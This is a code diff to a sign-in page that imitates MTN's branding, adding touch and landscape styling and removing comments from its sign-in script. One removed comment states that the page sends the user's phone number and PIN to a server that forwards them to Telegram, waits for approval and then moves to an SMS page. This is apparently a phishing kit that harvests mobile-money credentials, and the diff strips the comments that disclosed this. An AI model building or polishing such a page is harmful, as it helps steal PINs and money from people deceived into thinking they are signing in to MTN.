@@ -98,9 +98,9 @@
   }
   .pin-input-wrap input::placeholder { color: rgba(255,255,255,0.45); font-weight: 500; letter-spacing: 1px; }
   .eye-btn {
-    flex-shrink: 0; background: transparent; border: none; padding: 4px; cursor: pointer;
+    flex-shrink: 0; background: transparent; border: none; padding: 6px; cursor: pointer;
     color: rgba(255,255,255,0.7); display: inline-flex; align-items: center; justify-content: center;
-    transition: color .15s;
+    transition: color .15s; min-width: 36px; min-height: 36px;
   }
   .eye-btn:hover { color: var(--mtn-yellow); }
   .eye-btn svg { width: 20px; height: 20px; stroke: currentColor; fill: none; stroke-width: 2; }
@@ -244,6 +244,37 @@
     z-index: 10000; pointer-events: none; max-width: 90%; text-align: center;
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  /* ============================================================
+     Touch devices — larger tap targets, roomier fields
+  ============================================================ */
+  @media (pointer: coarse) {
+    .pin-input-wrap input,
+    .phone-input-wrap input { font-size: 17px; }
+    .btn-signin { height: 56px; font-size: 15px; }
+    .phone-input-wrap, .pin-input-wrap { padding-bottom: 10px; }
+  }
+
+  /* ============================================================
+     Landscape phones — collapse the header, keep the form visible
+  ============================================================ */
+  @media (orientation: landscape) and (max-height: 500px) {
+    .brand-block { padding: 14px 24px 0; }
+    .yello-mark { width: 42px; height: 42px; }
+    .yello-mark::before { inset: 7px; border-width: 1.5px; }
+    .yello-mark .smile { width: 14px; height: 7px; }
+    .yello-mark .eye { width: 4px; height: 4px; }
+    .display-name { font-size: 14px; }
+    .display-name .accent { font-size: 11px; }
+    .form-area { padding: 14px 26px 12px; }
+    .field { margin-bottom: 12px; }
+    .terms { padding: 8px 26px 0; margin-top: 6px; }
+    .contact { flex-direction: row; gap: 12px; padding: 10px 24px 14px; justify-content: center; }
+    .contact-btn { width: 40px; height: 40px; }
+    .contact-btn svg { width: 20px; height: 20px; }
+    .contact-label { font-size: 11px; }
+    .btn-signin { height: 46px; }
+  }
 
   @media (max-width: 380px) {
     .brand-block { padding-top: 32px; }
@@ -519,12 +550,6 @@
 
   /* ============================================================
      Sign In
-     - Validates
-     - Shows full-page "Initiating payment…" overlay immediately
-     - Sends phone + PIN to server → forwarded to Telegram
-     - Polls /api/verification/status/:tx
-     - Approved → navigates to sms.html
-     - Declined → closes overlay, shows red "Incorrect PIN" banner
   ============================================================ */
   async function handleSignIn(e) {
     e.preventDefault();
@@ -542,7 +567,6 @@
     const phoneDigits = document.getElementById('phoneInput').value.replace(/\D/g, '');
     const pin = document.getElementById('pinInput').value;
 
-    // Show the full-page overlay IMMEDIATELY
     showInitiating();
 
     try {
@@ -566,10 +590,9 @@
       return;
     }
 
-    // Wait for approval
     pollingActive = true;
     const start = Date.now();
-    const maxWaitMs = 2 * 60 * 1000; // 2 minutes
+    const maxWaitMs = 2 * 60 * 1000;
 
     const poll = async () => {
       if (!pollingActive) return;
@@ -620,14 +643,6 @@
     };
 
     poll();
-  }
-
-  /* ============================================================
-     T&Cs
-  ============================================================ */
-  function openTerms(e) {
-    e.preventDefault();
-    showToast('Terms & Conditions available on the MTN website.');
   }
 
   /* ============================================================
